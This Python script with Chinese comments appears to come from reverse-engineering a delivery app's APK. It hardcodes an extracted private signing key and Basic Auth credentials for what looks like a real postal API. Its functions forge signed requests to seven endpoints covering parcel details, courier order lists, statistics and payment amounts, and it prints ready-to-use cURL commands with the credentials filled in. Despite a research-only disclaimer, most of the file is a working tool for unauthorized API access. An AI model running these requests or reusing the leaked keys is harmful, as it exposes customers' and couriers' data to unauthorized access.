#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DingDong API 调用示例脚本
演示如何使用提取的密钥调用API查询订单

⚠️ 警告：仅用于安全研究和教育目的！
"""

import hashlib
import base64
import requests
import json
from datetime import datetime

# ============================================
# 从APK中提取的硬编码密钥
# ============================================

# API配置
API_BASE_URL = "https://api-dingdong.ems.com.vn/"
PRIVATE_KEY = "34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A"

# HTTP Basic Auth 凭证
BASIC_AUTH_USER = "lottnet"
BASIC_AUTH_PASS = "dms"

# ============================================
# 工具函数
# ============================================

def generate_sha256_signature(*params):
    """
    生成SHA256签名
    签名算法: SHA256(参数1 + 参数2 + ... + PRIVATE_KEY).toUpperCase()
    """
    # 拼接所有参数和私钥
    concat_string = ''.join(str(p) for p in params) + PRIVATE_KEY
    
    # SHA256哈希
    hash_obj = hashlib.sha256(concat_string.encode('utf-8'))
    
    # 转换为十六进制并转大写
    signature = hash_obj.hexdigest().upper()
    
    return signature


def get_basic_auth_header():
    """
    生成HTTP Basic Auth头部
    """
    credentials = f"{BASIC_AUTH_USER}:{BASIC_AUTH_PASS}"
    b64_credentials = base64.b64encode(credentials.encode()).decode()
    return f"Basic {b64_credentials}"


def get_headers(use_basic_auth=True):
    """
    生成请求头
    """
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "DingDong/3.3.2 (Android)",
    }
    
    if use_basic_auth:
        headers["Authorization"] = get_basic_auth_header()
        headers["APIKey"] = PRIVATE_KEY
    
    return headers


# ============================================
# API 1: 查询运单信息（需要签名）
# ============================================

def check_lading_code(parcel_code):
    """
    检查运单号
    API: POST /api/Delivery/CheckLadingCode
    需要签名: SHA256(ParcelCode + PRIVATE_KEY)
    """
    print(f"\n{'='*60}")
    print(f"API 1: 检查运单号")
    print(f"{'='*60}")
    
    # 生成签名
    signature = generate_sha256_signature(parcel_code)
    
    print(f"运单号: {parcel_code}")
    print(f"签名计算: SHA256('{parcel_code}' + PRIVATE_KEY)")
    print(f"签名结果: {signature}")
    
    # 请求参数
    data = {
        "ParcelCode": parcel_code,
        "Signature": signature
    }
    
    # 发送请求
    url = f"{API_BASE_URL}api/Delivery/CheckLadingCode"
    
    try:
        response = requests.post(url, data=data, headers=get_headers())
        print(f"\n状态码: {response.status_code}")
        print(f"响应内容:")
        print(json.dumps(response.json(), indent=2, ensure_ascii=False))
        return response.json()
    except Exception as e:
        print(f"请求失败: {e}")
        return None


# ============================================
# API 2: 查询包裹详细信息（需要签名）
# ============================================

def search_parcel_delivery(parcel_code):
    """
    查询包裹配送信息
    API: POST /api/Delivery/Inquiry
    需要签名: SHA256(ParcelCode + PRIVATE_KEY)
    """
    print(f"\n{'='*60}")
    print(f"API 2: 查询包裹配送信息")
    print(f"{'='*60}")
    
    # 生成签名
    signature = generate_sha256_signature(parcel_code)
    
    print(f"运单号: {parcel_code}")
    print(f"签名: {signature}")
    
    # 请求参数
    data = {
        "ParcelCode": parcel_code,
        "Signature": signature
    }
    
    # 发送请求
    url = f"{API_BASE_URL}api/Delivery/Inquiry"
    
    try:
        response = requests.post(url, data=data, headers=get_headers())
        print(f"\n状态码: {response.status_code}")
        print(f"响应内容:")
        print(json.dumps(response.json(), indent=2, ensure_ascii=False))
        return response.json()
    except Exception as e:
        print(f"请求失败: {e}")
        return None


# ============================================
# API 3: 查询快递员配送订单列表
# ============================================

def search_delivery_postman(postman_id, from_date, shift_id="", ch_thu="", tui_so=""):
    """
    查询快递员配送订单
    API: POST /api/Delivery/DeliveryPostman
    参数:
    - PostmanId: 快递员ID
    - FromDate: 日期 (格式: YYYY-MM-DD)
    - ShiftID: 班次ID
    - ChThu: 支票
    - TuiSo: 邮袋号
    """
    print(f"\n{'='*60}")
    print(f"API 3: 查询快递员配送订单")
    print(f"{'='*60}")
    
    print(f"快递员ID: {postman_id}")
    print(f"日期: {from_date}")
    
    # 请求参数
    data = {
        "PostmanId": postman_id,
        "FromDate": from_date,
        "ShiftID": shift_id,
        "ChThu": ch_thu,
        "TuiSo": tui_so
    }
    
    # 发送请求
    url = f"{API_BASE_URL}api/Delivery/DeliveryPostman"
    
    try:
        response = requests.post(url, data=data, headers=get_headers())
        print(f"\n状态码: {response.status_code}")
        print(f"响应内容:")
        print(json.dumps(response.json(), indent=2, ensure_ascii=False))
        return response.json()
    except Exception as e:
        print(f"请求失败: {e}")
        return None


# ============================================
# API 4: 查询收件订单
# ============================================

def search_order_postman_collect(postman_id, order_id="", status="", 
                                  from_date="", to_date="",
                                  order_code="", customer_code="", tracking_code=""):
    """
    查询收件订单
    API: POST /api/Collect/SearchOrderPostman
    参数:
    - OrderPostmanID: 订单快递员ID
    - OrderID: 订单ID
    - PostmanID: 快递员ID
    - Status: 状态
    - FromAssignDate: 开始日期
    - ToAssignDate: 结束日期
    - OrderCode: 订单编号
    - CustomerCode: 客户编号
    - TrackingCode: 追踪编号
    """
    print(f"\n{'='*60}")
    print(f"API 4: 查询收件订单")
    print(f"{'='*60}")
    
    print(f"快递员ID: {postman_id}")
    
    # 请求参数
    data = {
        "OrderPostmanID": "",
        "OrderID": order_id,
        "PostmanID": postman_id,
        "Status": status,
        "FromAssignDate": from_date,
        "ToAssignDate": to_date,
        "OrderCode": order_code,
        "CustomerCode": customer_code,
        "TrackingCode": tracking_code
    }
    
    # 发送请求
    url = f"{API_BASE_URL}api/Collect/SearchOrderPostman"
    
    try:
        response = requests.post(url, data=data, headers=get_headers())
        print(f"\n状态码: {response.status_code}")
        print(f"响应内容:")
        print(json.dumps(response.json(), indent=2, ensure_ascii=False))
        return response.json()
    except Exception as e:
        print(f"请求失败: {e}")
        return None


# ============================================
# API 5: 查询配送统计
# ============================================

def search_delivery_statistic(postman_id, from_date, to_date, status="", shift_id=""):
    """
    查询配送统计
    API: POST /api/Delivery/DeliveryStatistic
    """
    print(f"\n{'='*60}")
    print(f"API 5: 查询配送统计")
    print(f"{'='*60}")
    
    print(f"快递员ID: {postman_id}")
    print(f"日期范围: {from_date} - {to_date}")
    
    # 请求参数
    data = {
        "FromDate": from_date,
        "ToDate": to_date,
        "Status": status,
        "PostmanId": postman_id,
        "ShiftID": shift_id
    }
    
    # 发送请求
    url = f"{API_BASE_URL}api/Delivery/DeliveryStatistic"
    
    try:
        response = requests.post(url, data=data, headers=get_headers())
        print(f"\n状态码: {response.status_code}")
        print(f"响应内容:")
        print(json.dumps(response.json(), indent=2, ensure_ascii=False))
        return response.json()
    except Exception as e:
        print(f"请求失败: {e}")
        return None


# ============================================
# API 6: 查询包裹配送历史
# ============================================

def get_history_delivery(parcel_code):
    """
    查询包裹配送历史
    API: POST /api/Delivery/DeliveryLadingJourney
    """
    print(f"\n{'='*60}")
    print(f"API 6: 查询包裹配送历史")
    print(f"{'='*60}")
    
    print(f"运单号: {parcel_code}")
    
    # 请求参数
    data = {
        "ParcelCode": parcel_code
    }
    
    # 发送请求
    url = f"{API_BASE_URL}api/Delivery/DeliveryLadingJourney"
    
    try:
        response = requests.post(url, data=data, headers=get_headers())
        print(f"\n状态码: {response.status_code}")
        print(f"响应内容:")
        print(json.dumps(response.json(), indent=2, ensure_ascii=False))
        return response.json()
    except Exception as e:
        print(f"请求失败: {e}")
        return None


# ============================================
# API 7: 查询金额信息（需要签名）
# ============================================

def get_inquiry_amount(parcel_code):
    """
    查询金额信息
    API: POST /api/Delivery/InquiryAmount
    需要签名: SHA256(ParcelCode + PRIVATE_KEY)
    """
    print(f"\n{'='*60}")
    print(f"API 7: 查询金额信息")
    print(f"{'='*60}")
    
    # 生成签名
    signature = generate_sha256_signature(parcel_code)
    
    print(f"运单号: {parcel_code}")
    print(f"签名: {signature}")
    
    # 请求参数
    data = {
        "ParcelCode": parcel_code,
        "Signature": signature
    }
    
    # 发送请求
    url = f"{API_BASE_URL}api/Delivery/InquiryAmount"
    
    try:
        response = requests.post(url, data=data, headers=get_headers())
        print(f"\n状态码: {response.status_code}")
        print(f"响应内容:")
        print(json.dumps(response.json(), indent=2, ensure_ascii=False))
        return response.json()
    except Exception as e:
        print(f"请求失败: {e}")
        return None


# ============================================
# 主函数 - 使用示例
# ============================================

def main():
    """
    主函数 - 演示API调用
    """
    print("""
╔══════════════════════════════════════════════════════════════╗
║           DingDong API 调用示例                              ║
║                                                              ║
║  ⚠️  警告：仅用于安全研究和教育目的！                        ║
║  ⚠️  请勿用于非法用途！                                      ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    print("\n提取的关键信息:")
    print(f"API Base URL: {API_BASE_URL}")
    print(f"Private Key: {PRIVATE_KEY}")
    print(f"Basic Auth: {BASIC_AUTH_USER}:{BASIC_AUTH_PASS}")
    print(f"Base64 Auth: {get_basic_auth_header()}")
    
    # ============================================
    # 使用示例
    # ============================================
    
    print("\n\n" + "="*60)
    print("示例 1: 查询运单信息")
    print("="*60)
    print("\n你需要提供实际的运单号来查询")
    print("示例调用:")
    print('  check_lading_code("EH123456789VN")')
    
    # 如果有真实运单号，取消下面的注释
    # parcel_code = "EH123456789VN"  # 替换为真实运单号
    # check_lading_code(parcel_code)
    
    print("\n\n" + "="*60)
    print("示例 2: 查询快递员订单")
    print("="*60)
    print("\n你需要提供快递员ID和日期")
    print("示例调用:")
    print('  search_delivery_postman("12345", "2025-10-14")')
    
    # 如果有真实快递员ID，取消下面的注释
    # postman_id = "12345"  # 替换为真实快递员ID
    # today = datetime.now().strftime("%Y-%m-%d")
    # search_delivery_postman(postman_id, today)
    
    print("\n\n" + "="*60)
    print("示例 3: 查询配送历史")
    print("="*60)
    print("\n示例调用:")
    print('  get_history_delivery("EH123456789VN")')
    
    print("\n\n" + "="*60)
    print("所有可用的API函数:")
    print("="*60)
    print("""
1. check_lading_code(parcel_code)
   - 检查运单号是否有效
   - 需要: 运单号
   - 需要签名: 是

2. search_parcel_delivery(parcel_code)
   - 查询包裹详细配送信息
   - 需要: 运单号
   - 需要签名: 是

3. search_delivery_postman(postman_id, from_date, ...)
   - 查询快递员的配送订单列表
   - 需要: 快递员ID, 日期
   - 需要签名: 否

4. search_order_postman_collect(postman_id, ...)
   - 查询收件订单
   - 需要: 快递员ID
   - 需要签名: 否

5. search_delivery_statistic(postman_id, from_date, to_date, ...)
   - 查询配送统计数据
   - 需要: 快递员ID, 日期范围
   - 需要签名: 否

6. get_history_delivery(parcel_code)
   - 查询包裹配送历史轨迹
   - 需要: 运单号
   - 需要签名: 否

7. get_inquiry_amount(parcel_code)
   - 查询包裹金额信息
   - 需要: 运单号
   - 需要签名: 是
    """)
    
    print("\n" + "="*60)
    print("签名算法说明:")
    print("="*60)
    print("""
对于需要签名的API，签名生成方式为:
1. 拼接所有参数和私钥: param1 + param2 + ... + PRIVATE_KEY
2. 计算 SHA256 哈希
3. 转换为十六进制字符串
4. 转换为大写

示例 Python 代码:
    signature = hashlib.sha256(
        (param1 + param2 + PRIVATE_KEY).encode('utf-8')
    ).hexdigest().upper()
    """)


# ============================================
# cURL 命令示例
# ============================================

def print_curl_examples():
    """
    打印 cURL 命令示例
    """
    print("\n\n" + "="*60)
    print("cURL 命令示例")
    print("="*60)
    
    parcel_code = "EH123456789VN"
    signature = generate_sha256_signature(parcel_code)
    basic_auth = get_basic_auth_header()
    
    print("\n1. 查询运单信息:")
    print(f"""
curl -X POST '{API_BASE_URL}api/Delivery/CheckLadingCode' \\
  -H 'Content-Type: application/x-www-form-urlencoded' \\
  -H 'Authorization: {basic_auth}' \\
  -H 'APIKey: {PRIVATE_KEY}' \\
  -d 'ParcelCode={parcel_code}&Signature={signature}'
    """)
    
    print("\n2. 查询快递员订单:")
    print(f"""
curl -X POST '{API_BASE_URL}api/Delivery/DeliveryPostman' \\
  -H 'Content-Type: application/x-www-form-urlencoded' \\
  -H 'Authorization: {basic_auth}' \\
  -H 'APIKey: {PRIVATE_KEY}' \\
  -d 'PostmanId=12345&FromDate=2025-10-14&ShiftID=&ChThu=&TuiSo='
    """)
    
    print("\n3. 查询配送历史:")
    print(f"""
curl -X POST '{API_BASE_URL}api/Delivery/DeliveryLadingJourney' \\
  -H 'Content-Type: application/x-www-form-urlencoded' \\
  -H 'Authorization: {basic_auth}' \\
  -H 'APIKey: {PRIVATE_KEY}' \\
  -d 'ParcelCode={parcel_code}'
    """)


if __name__ == "__main__":
    main()
    print_curl_examples()
    
    print("\n\n" + "="*60)
    print("使用方法:")
    print("="*60)
    print("""
1. 安装依赖: pip install requests

2. 修改代码中的参数（运单号、快递员ID等）

3. 运行脚本: python api_call_examples.py

4. 或在Python中导入使用:
   from api_call_examples import check_lading_code
   check_lading_code("EH123456789VN")
    """)
